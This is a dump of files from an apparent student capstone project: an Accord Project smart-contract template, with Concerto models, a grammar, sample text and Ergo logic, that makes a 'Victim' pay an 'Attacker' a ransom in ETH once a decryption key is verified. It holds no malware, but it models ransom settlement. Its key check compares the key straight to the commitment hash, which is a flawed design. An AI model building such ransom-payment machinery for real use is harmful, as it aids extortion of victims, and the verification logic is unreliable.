  o CryptoCurrencyCode cryptoCurrencyCode
}

/**
 * Cyptocurrency codes. From https://en.wikipedia.org/wiki/List_of_cryptocurrencies
 */
enum CryptoCurrencyCode {
  o ADA
  o BCH
  o BTC
  o DASH
  o EOS
  o ETC
  o ETH
  o LTC
  o NEO
  o XLM
  o XMR
  o XRP
  o ZEC
}

/**
 * Represents an amount of money
 */
concept MonetaryAmount {
  o Double doubleValue // convert to fixed-point?
  o CurrencyCode currencyCode
}

/**
 * ISO 4217 codes. From https://en.wikipedia.org/wiki/ISO_4217
 * https://www.currency-iso.org/en/home/tables/table-a1.html
 */
enum CurrencyCode {
o AED
o AFN
o ALL
o AMD
o ANG
o AOA
o ARS
o AUD
o AWG
o AZN
o BAM
o BBD
o BDT
o BGN
o BHD
o BIF
o BMD
o BND
o BOB
o BOV
o BRL
o BSD
o BTN
o BWP
o BYN
o BZD
o CAD
o CDF
o CHE
o CHF
o CHW
o CLF
o CLP
o CNY
o COP
o COU
o CRC
o CUC
o CUP
o CVE
o CZK
o DJF
o DKK
o DOP
o DZD
o EGP
o ERN
o ETB
o EUR
o FJD
o FKP
o GBP
o GEL
o GHS
o GIP
o GMD
o GNF
o GTQ
o GYD
o HKD
o HNL
o HRK
o HTG
o HUF
o IDR
o ILS
o INR
o IQD
o IRR
o ISK
o JMD
o JOD
o JPY
o KES
o KGS
o KHR
o KMF
o KPW
o KRW
o KWD
o KYD
o KZT
o LAK
o LBP
o LKR
o LRD
o LSL
o LYD
o MAD
o MDL
o MGA
o MKD
o MMK
o MNT
o MOP
o MRU
o MUR
o MVR
o MWK
o MXN
o MXV
o MYR
o MZN
o NAD
o NGN
o NIO
o NOK
o NPR
o NZD
o OMR
o PAB
o PEN
o PGK
o PHP
o PKR
o PLN
o PYG
o QAR
o RON
o RSD
o RUB
o RWF
o SAR
o SBD
o SCR
o SDG
o SEK
o SGD
o SHP
o SLL
o SOS
o SRD
o SSP
o STN
o SVC
o SYP
o SZL
o THB
o TJS
o TMT
o TND
o TOP
o TRY
o TTD
o TWD
o TZS
o UAH
o UGX
o USD
o USN
o UYI
o UYU
o UZS
o VEF
o VND
o VUV
o WST
o XAF
o XAG
o XAU
o XBA
o XBB
o XBC
o XBD
o XCD
o XDR
o XOF
o XPD
o XPF
o XPT
o XSU
o XTS
o XUA
o XXX
o YER
o ZAR
o ZMW
o ZWL
}

================================================================================


File: /opt/Capstone/templates/ransomware-template/model/@models.accordproject.org.cicero.contract.cto
================================================================================
/*
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

namespace org.accordproject.cicero.contract

/**
 * Contract Data
 * -- Describes the structure of contracts and clauses
 */

/* A contract state is an asset -- The runtime state of the contract */
asset AccordContractState identified by stateId {
  o String stateId
}

/* A party to a contract */
participant AccordParty identified by partyId {
  o String partyId
}

/* A contract is a asset -- This contains the contract data */
abstract asset AccordContract identified by contractId {
  o String contractId
  --> AccordParty[] parties optional
}

/* A clause is an asset -- This contains the clause data */
abstract asset AccordClause identified by clauseId {
  o String clauseId
}

================================================================================


File: /opt/Capstone/templates/ransomware-template/model/@models.accordproject.org.accordproject.runtime.cto
================================================================================
/*
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

concerto version ">= 1.0.0"

namespace org.accordproject.runtime

import org.accordproject.contract.Contract from https://models.accordproject.org/accordproject/contract.cto

/**
 * Runtime API
 * -- Describes input and output of calls to a contract's clause
 */

/* A request is a transaction */
transaction Request {
}

/* A response is a transaction */
transaction Response {
}

/* An event that represents an obligation that needs to be fulfilled */
abstract event Obligation identified {
  /* A back reference to the governing contract that emitted this obligation */
  --> Contract contract

  /* The party that is obligated */
  --> Participant promisor optional

  /* The party that receives the performance */
  --> Participant promisee optional

  /* The time before which the obligation is fulfilled */
  o DateTime deadline optional
}

/* A contract state is an asset -- The runtime state of the contract */
asset State {
}

================================================================================


File: /opt/Capstone/templates/ransomware-template/model/@models.accordproject.org.cicero.runtime.cto
================================================================================
/*
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// requires: concerto-core:<=0.82.11
namespace org.accordproject.cicero.runtime

import org.accordproject.cicero.contract.AccordContract from https://models.accordproject.org/cicero/contract.cto
import org.accordproject.cicero.contract.AccordContractState from https://models.accordproject.org/cicero/contract.cto
import org.accordproject.money.MonetaryAmount from https://models.accordproject.org/money.cto

/**
 * Contract API
 * -- Describes input and output of calls to a contract's clause
 */

/* A request is a transaction */
transaction Request {}

/* A response is a transaction */
transaction Response {}

/* An Error is a transaction */
abstract transaction ErrorResponse {}

/* An event that represents an obligation that needs to be fulfilled */
abstract event Obligation {
  /* A back reference to the governing contract that emitted this obligation */
  --> AccordContract contract

  /* The party that is obligated */
  --> Participant promisor optional // TODO make this mandatory once proper party support is in place

  /* The party that receives the performance */
  --> Participant promisee optional // TODO make this mandatory once proper party support is in place

  /* The time before which the obligation is fulfilled */
  o DateTime deadline optional
}

event PaymentObligation extends Obligation{
  o MonetaryAmount amount
  o String description
}

event NotificationObligation extends Obligation {
  o String title
  o String message
}

/* A payload has contract data, a request and a state */
concept Payload {
  o AccordContract contract  // the contract data
  o Request request
  o AccordContractState state optional
}

/* If the call to a contract's clause succeeds, it returns a response, a list of events and a new state */
concept Success {
  o Response response
  o AccordContractState state
  o Event[] emit
}
/* If the call to a contract's clause fails, it returns and error */ 
concept Failure {
  o ErrorResponse error
}

/**
 * The functional signature for a contract call is as follows:
 * clausecall : String contractName -> String clauseName -> Payload payload -> Success | Failure
 */

================================================================================


File: /opt/Capstone/templates/ransomware-template/grammar/sample.md
================================================================================
Upon verification of the decryption key against commitment "c5cb769909fb4aae0eec3b46574c14e0a0ef58adae5a3ea966ca81fda52aa214", "Victim 1234" shall pay to "Attacker 5678" the amount of 1.0 ETH.
================================================================================


File: /opt/Capstone/templates/ransomware-template/grammar/grammar.tem.md
================================================================================
Upon verification of the decryption key against commitment "{{% fileCommitment %}}", "{{% buyer.name %}}" shall pay to "{{% seller.name %}}" the amount of {{% paymentAmount %}}.

================================================================================


File: /opt/Capstone/templates/ransomware-template/logic/logic.ergo
================================================================================
namespace org.accordproject.ransomware.recovery

import org.accordproject.obligation.*
import org.accordproject.money.*
import org.accordproject.runtime.*

contract RansomwareRecovery over RansomwareContract state RansomwareContractState {
  
  clause init(request: Request) : Response {
    set state RansomwareContractState {
      status: ContractStatus.CREATED
    };
    return Response{}
  }
  
  clause decrypt(request : DecryptionRequest) : DecryptionResponse emits PaymentObligation {
    // Verify the decryption key matches the commitment
    let verificationSuccess = request.decryptionKey = contract.fileCommitment;
    
    if verificationSuccess then
      emit PaymentObligation{
        contract: contract,
        promisor: some(contract.buyer),
        promisee: some(contract.seller),
        deadline: none,
        amount: contract.paymentAmount,
        description: toString(contract.buyer) ++ " should pay ransom amount to " ++ toString(contract.seller)
      };
      set state RansomwareContractState {
        status: ContractStatus.PAYMENT_PENDING
      };
      return DecryptionResponse{
        success: true,
        message: "Decryption verified successfully"
      }
    else 
      return DecryptionResponse{
        success: false,
        message: "Invalid decryption key"
      }
  }
}
================================================================================


File: /opt/Capstone/templates/ransomware-template/text/sample.md
================================================================================
Upon verification of the decryption key against commitment "c5cb769909fb4aae0eec3b46574c14e0a0ef58adae5a3ea966ca81fda52aa214", "Victim 1234" shall pay to "Attacker 5678" the amount of 1.0 ETH.
================================================================================


File: /opt/Capstone/templates/ransomware-template/text/grammar.tem.md
================================================================================
Upon verification of the decryption key against commitment "{{% fileCommitment %}}", "{{% buyer.name %}}" shall pay to "{{% seller.name %}}" the amount of {{% paymentAmount %}}.

================================================================================

